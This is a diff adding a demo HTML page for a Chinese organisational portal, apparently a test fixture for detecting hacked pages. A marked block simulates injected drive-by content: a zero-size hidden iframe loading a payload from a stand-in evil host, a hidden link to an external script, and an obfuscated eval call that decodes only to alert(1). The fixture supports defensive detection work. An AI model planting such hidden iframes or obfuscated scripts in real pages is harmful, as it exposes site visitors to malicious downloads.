@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>某单位门户网站</title>
+  <link rel="stylesheet" href="/static/site.css">
+</head>
+<body>
+  <h1>某单位门户网站</h1>
+  <nav>
+    <a href="/news.html">新闻动态</a>
+    <a href="/about.html">单位简介</a>
+  </nav>
+  <p>欢迎访问本单位门户网站，本站为演示用测试站点。</p>
+  <p>友情链接：<a href="https://www.gov.cn/">中国政府网</a></p>
+  <p>合作单位：<a href="https://www.example.com/contact">外部合作单位</a></p>
+  <!-- 以下两行为模拟被注入的挂马内容：隐藏 iframe + 外部恶意脚本 + 混淆代码 -->
+  <iframe width="0" height="0" src="https://evil.example.cc/payload?ref=portal"></iframe>
+  <a href="https://badcdn.top/a.js" style="display:none">推广活动</a>
+  <script>eval(unescape('%61%6c%65%72%74%28%31%29'));</script>
+  <script src="/static/app.js"></script>
+</body>
+</html>
